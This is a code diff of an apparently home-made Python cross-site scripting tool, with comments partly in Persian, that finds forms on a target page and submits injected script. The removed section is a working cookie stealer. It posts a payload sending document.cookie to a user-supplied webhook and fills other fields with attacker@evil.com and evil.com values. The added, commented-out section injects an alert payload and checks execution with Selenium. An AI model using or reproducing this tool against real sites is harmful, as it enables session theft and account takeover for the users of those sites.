@@ -70,7 +70,7 @@ res = session.post(submit_url, data=data, verify=False)
 print(f"[+] status: {res.status_code}")
 
 
-# # FORM CHOOSER
+# # $$$$$$$$$$$$$$$$$$$$$$$$$  FORM CHOOSER   $$$$$$$$$$$$$$$$$$$$$$$$$4
 
 # import requests
 # from bs4 import BeautifulSoup
@@ -158,7 +158,7 @@ print(f"[+] status: {res.status_code}")
 
 
 
-# NORMAL FORM
+# # $$$$$$$$$$$$$$$$$$$$$$$  NORMAL FORM  $$$$$$$$$$$$$$$$$
 
 # import requests
 # from bs4 import BeautifulSoup
@@ -214,7 +214,7 @@ print(f"[+] status: {res.status_code}")
 
 
 
-# SELENIUM
+# # $$$$$$$$$$$$$$$$$$$$$   SELENIUM   $$$$$$$$$$$$$$$$$$444444444
 
 
 
@@ -319,82 +319,98 @@ print(f"[+] status: {res.status_code}")
 
 
 
+# # $$$$$$$$$$$$$$$$$$$$$$$    FULL COMBINE   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 
 
 
+# import requests
+# from bs4 import BeautifulSoup
+# from urllib.parse import urljoin
+# import urllib3
+# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+# # XSS payload پیشنهاد شده
+# default_payload = '<script>alert(1)</script>'
 
+# # دریافت آدرس هدف
+# url = input("[?] Enter full URL: ").strip()
+# confirm_payload = input(f"[?] Use default payload {default_payload}? (y/n): ").lower()
+# if confirm_payload != 'y':
+#     payload = input("[?] Enter your custom payload: ").strip()
+# else:
+#     payload = default_payload
 
+# # دریافت فرم‌ها
+# session = requests.Session()
+# res = session.get(url, verify=False)
+# soup = BeautifulSoup(res.text, "html.parser")
+# forms = soup.find_all("form")
 
+# if not forms:
+#     print("[-] No forms found.")
+#     exit()
 
+# print(f"[+] Found {len(forms)} form(s).")
+# for i, form in enumerate(forms):
+#     print(f"\nForm #{i + 1}")
+#     print(" Action:", form.get("action"))
+#     print(" Method:", form.get("method", "GET").upper())
+#     for inp in form.find_all(["input", "textarea", "select"]):
+#         print(f" - {inp.name}: type={inp.get('type', 'text')}, name={inp.get('name')}")
 
-import requests
-from bs4 import BeautifulSoup
-import urllib3
-from urllib.parse import urljoin
+# # انتخاب فرم
+# choice = int(input(f"\n[?] Choose form to use (1-{len(forms)}): ")) - 1
+# selected_form = forms[choice]
+# action = selected_form.get("action")
+# method = selected_form.get("method", "get").lower()
+# submit_url = urljoin(url, action)
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# # آماده‌سازی دیتا
+# data = {}
+# for field in selected_form.find_all(["input", "textarea", "select"]):
+#     name = field.get("name")
+#     if not name:
+#         continue
+#     field_type = field.get("type", "text")
+#     if field_type in ["hidden", "submit"]:
+#         data[name] = field.get("value", "")
+#         continue
+#     confirm = input(f"[?] Use XSS payload in '{name}'? (y/n): ").lower()
+#     if confirm == 'y':
+#         data[name] = payload
+#     else:
+#         data[name] = input(f"[+] Enter value for '{name}': ")
 
-url = input("enter your target post URL: ").strip()
-webhook = input("enter your webhook URL: ").strip()
+# # ارسال فرم
+# print(f"\n[+] Submitting form to {submit_url}...")
+# if method == "post":
+#     response = session.post(submit_url, data=data, verify=False)
+# else:
+#     response = session.get(submit_url, params=data, verify=False)
 
-# Payload XSS
-payload = f'<script>new Image().src="{webhook}?c="+document.cookie;</script>'
+# print(f"[+] Status code: {response.status_code}")
 
-session = requests.Session()
-res = session.get(url, verify=False)
-soup = BeautifulSoup(res.text, "html.parser")
+# # سوال در مورد تست با Selenium
+# use_selenium = input("[?] Run Selenium to check execution? (y/n): ").lower()
+# if use_selenium != 'y':
+#     exit()
 
-forms = soup.find_all("form")
-print(f"[+] Found {len(forms)} form(s)")
+# # اجرای Selenium برای تست بصری
+# from selenium import webdriver
+# from selenium.webdriver.common.by import By
+# from selenium.webdriver.firefox.options import Options
+# import time
 
-for i, form in enumerate(forms):
-    print(f"\nForm #{i+1}")
-    print(" Action:", form.get("action"))
-    print(" Method:", form.get("method"))
-    for input_tag in form.find_all(["input", "textarea"]):
-        print(f"  {input_tag.name}: type={input_tag.get('type','text')}, name={input_tag.get('name')}")
+# options = Options()
+# options.headless = False  # مرورگر باز بشه برای دیدن پیغام
+# driver = webdriver.Firefox(options=options)
+# driver.get(url)
+# time.sleep(2)
 
-choice = int(input(f"\nChoose form to submit (1-{len(forms)}): ")) - 1
-form = forms[choice]
-
-action = form.get("action")
-method = form.get("method", "get").lower()
-submit_url = action if action.startswith("http") else urljoin(url, action)
-
-# Prepare payload data
-data = {}
-for input_tag in form.find_all(["input", "textarea"]):
-    name = input_tag.get("name")
-    if not name:
-        continue
-    if name == "email":
-        data[name] = "attacker@evil.com"
-    elif name == "postId":
-        data[name] = url.split("postId=")[-1]
-    elif name == "csrf":
-        data[name] = input_tag.get("value", "")
-        print("[*] CSRF token:", data[name])
-    elif input_tag.name == "textarea":
-        data[name] = payload
-    elif name == "website":
-        data[name] = "https://evil.com"
-    else:
-        data[name] = "attacker"
-
-print(f"\n[+] Sending payload to {submit_url} ...")
-res = session.post(submit_url, data=data, verify=False)
-print("[+] Status code:", res.status_code)
-
-if res.status_code == 200:
-    print("[✓] Payload sent successfully. Check webhook!")
-elif res.status_code == 400:
-    print("[-] Bad request (400). Check for missing or invalid form fields.")
-else:
-    print("[-] Something else went wrong.")
-
-
-
-print(f"[+] sending paylaod {submit_url}")
-res = session.post(submit_url, data=data, verify=False)
-print(f"[+] status: {res.status_code}")
+# try:
+#     alert = driver.switch_to.alert
+#     print(f"[✓] Alert detected: {alert.text} ✅")
+#     alert.dismiss()
+# except:
+#     print("[-] No alert detected.")
+# driver.quit()
